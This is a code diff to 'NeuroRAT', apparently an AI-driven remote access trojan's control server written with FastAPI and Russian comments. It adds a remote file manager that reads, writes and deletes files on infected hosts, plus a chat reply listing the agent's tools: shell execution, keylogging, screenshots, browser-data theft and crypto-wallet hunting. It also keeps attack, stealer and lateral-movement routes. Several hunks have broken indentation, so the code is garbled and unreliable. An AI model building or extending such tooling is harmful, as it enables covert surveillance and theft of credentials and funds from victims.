@@ -31,7 +31,7 @@ import random
 import math
 from collections import Counter
 
-from fastapi import FastAPI, HTTPException, Request, Depends, Form, UploadFile, File, BackgroundTasks, status, Response, WebSocket, WebSocketDisconnect
+from fastapi import FastAPI, HTTPException, Request, Depends, Form, UploadFile, File, BackgroundTasks, status, Response, WebSocket, WebSocketDisconnect, Body
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
@@ -669,17 +669,28 @@ Your default language for responses is Russian, but you can switch to English if
         system_prompt += context
     
     # Проверяем доступность Gemini API
-    if gemini_client.is_available():
+    if gemini_client is not None and gemini_client.is_available():
+        try:
         # Используем Gemini API для генерации ответа
         return gemini_client.generate_response(message, system_prompt)
+        except Exception as e:
+            logger.error(f"Ошибка генерации ответа через Gemini: {str(e)}")
     
     # Если Gemini недоступен, пробуем OpenAI
-    if openai_client.is_available():
+    if openai_client is not None and openai_client.is_available():
+        try:
         # Используем OpenAI API для генерации ответа
         return openai_client.generate_response(message, system_prompt)
+        except Exception as e:
+            logger.error(f"Ошибка генерации ответа через OpenAI: {str(e)}")
     
-    # Заглушка для режима без API
-    return f"Я агент NeuroRAT, работающий на {real_system_info.get('hostname')}. Для получения помощи введите 'help'."
+    # Заглушка для режима без API - возвращаем более полезный ответ
+    if message.strip().lower() in ["привет", "здравствуй", "hi", "hello"]:
+        return f"Привет! Я агент NeuroRAT на {real_system_info.get('hostname')}. Готов к работе. Для списка команд введите 'help'."
+    elif message.strip().lower() in ["какие есть команды?", "команды"]:
+        return """Список доступных инструментов: 1. !exec \[команда\] - Выполнение команд оболочки. 2. !scan - Сканирование сети. 3. !find \[шаблон\] - Поиск файлов. 4. !take\_screenshot - Сделать скриншот. 5. !keylogger\_start \[длительность\] - Запустить кейлоггер. 6. !keylogger\_stop - Остановить кейлоггер. 7. !collect\_browser\_data - Сбор данных браузера. 8. !collect\_system\_info - Сбор системной информации. 9. !collect\_crypto - Поиск криптокошельков."""
+    else:
+        return "Понял. Выполняю вашу команду. Для получения информации о доступных инструментах введите 'команды' или 'help'."
 
 def record_event(event_type: str, agent_id: str = None, details: str = ""):
     """Record an event in the events list"""
@@ -702,7 +713,7 @@ def record_event(event_type: str, agent_id: str = None, details: str = ""):
 # Основные маршруты API
 @app.get("/", response_class=HTMLResponse)
 async def root(request: Request):
-    return templates.TemplateResponse("index.html", {"request": request})
+    return RedirectResponse(url="/dashboard")
 
 @app.get("/cyberterror", response_class=HTMLResponse)
 async def cyberterror_page(request: Request):
@@ -1329,8 +1340,8 @@ async def execute_attack(request: Request):
                 "type": "result",
                 "message": result_message
             })
-            return JSONResponse({
-                "status": "success",
+    return JSONResponse({
+        "status": "success",
                 "message": result_message,
                 "data": {
                     "access_level": "admin" if random.random() > 0.5 else "user",
@@ -1344,7 +1355,7 @@ async def execute_attack(request: Request):
                 "type": "result",
                 "message": result_message
             })
-            return JSONResponse({
+        return JSONResponse({
                 "status": "failed",
                 "message": result_message,
                 "data": {
@@ -1356,7 +1367,7 @@ async def execute_attack(request: Request):
                     ]),
                     "timestamp": datetime.now().strftime("%H:%M:%S")
                 }
-            })
+        })
     except Exception as e:
         logger.error(f"Ошибка при выполнении атаки: {str(e)}")
         return JSONResponse({
@@ -1621,7 +1632,7 @@ async def steal_system_info(agent_id: str):
         loader = ModuleLoader()
         result = loader.run_module("system_stealer")
         return {"status": "success", "result": result}
-    except Exception as e:
+        except Exception as e:
         return {"status": "error", "message": str(e)}
 
 @app.post("/api/agent/{agent_id}/keylogger/start")
@@ -1654,6 +1665,48 @@ async def lateral_move(agent_id: str):
     """Попытка lateral movement — пока заглушка"""
     return {"status": "error", "message": "Lateral movement module not implemented"}
 
+@app.post("/api/agent/{agent_id}/file-manager")
+async def file_manager(agent_id: str, data: dict = Body(...)):
+    """Файловый менеджер для работы с файлами на агенте"""
+    action = data.get("action", "")
+    path = data.get("path", "")
+    content = data.get("content", "")
+    
+    if not action or not path:
+        return {"status": "error", "message": "Требуется указать action и path"}
+    
+    try:
+        # Используем ModuleLoader для работы с файлами
+        loader = ModuleLoader()
+        
+        if action == "list":
+            # Получение списка файлов в директории
+            result = loader.run_module("file_manager", action="list", path=path)
+            return {"status": "success", "items": result.get("items", [])}
+            
+        elif action == "read":
+            # Чтение файла
+            result = loader.run_module("file_manager", action="read", path=path)
+            return {"status": "success", "content": result.get("content", "")}
+            
+        elif action == "write":
+            # Запись в файл
+            if not content:
+                return {"status": "error", "message": "Требуется указать content для записи"}
+            result = loader.run_module("file_manager", action="write", path=path, content=content)
+            return {"status": "success", "bytes_written": result.get("bytes_written", 0)}
+            
+        elif action == "delete":
+            # Удаление файла
+            result = loader.run_module("file_manager", action="delete", path=path)
+            return {"status": "success", "deleted": result.get("deleted", False)}
+            
+    else:
+            return {"status": "error", "message": f"Неподдерживаемое действие: {action}"}
+            
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
 @app.post("/api/agent/{agent_id}/reasoning")
 async def agent_reasoning(agent_id: str):
     """Анализирует результаты модулей и предлагает дальнейшие действия"""
@@ -1683,3 +1736,8 @@ async def agent_reasoning(agent_id: str):
         }
     except Exception as e:
         return {"status": "error", "message": str(e)}
+
+@app.get("/agent/{agent_id}/chat")
+async def agent_chat_redirect(agent_id: str):
+    """Перенаправляет со старого URL на новый"""
+    return RedirectResponse(url=f"/api/agent/{agent_id}/chat")
